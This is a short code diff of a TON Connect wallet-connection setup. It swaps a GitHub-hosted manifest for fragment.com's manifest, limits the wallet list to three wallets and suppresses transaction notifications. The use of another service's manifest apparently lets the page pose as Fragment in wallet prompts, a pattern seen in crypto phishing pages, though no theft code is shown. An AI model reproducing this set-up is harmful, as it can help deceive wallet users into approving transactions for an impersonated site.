@@ -1,15 +1,17 @@
-const nftSupported = ["Tonkeeper", "MyTonWallet", "TonHub"];
+const whitelist = ["Tonkeeper", "MyTonWallet", "TonHub"];
 
 // TON Connect 钱包连接管理
 let tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-  manifestUrl:
-    "https://raw.githubusercontent.com/netrandom/tonconnect/refs/heads/main/js",
-  walletsRequiredFeatures: {
-    sendTransaction: {
-      minMessages: 2, // 钱包至少支持 2 条消息（常见于 Jetton/NFT 操作）
-      extraCurrencyRequired: true, // 支持“额外币种”（Jetton）——对 NFT/代币生态更友好
-    },
+  manifestUrl: "https://fragment.com/tonconnect-manifest.json",
+  walletsListConfigurator: (wallets) => {
+    return wallets.filter(w => whitelist.includes(w.name));
   },
+  actionsConfiguration: {
+    modals: ["before"],
+    notifications: [],
+    returnStrategy: "back",
+  },
+  enableAndroidBackHandler: false,
   uiPreferences: {
     theme: "DARK",
     borderRadius: "s",
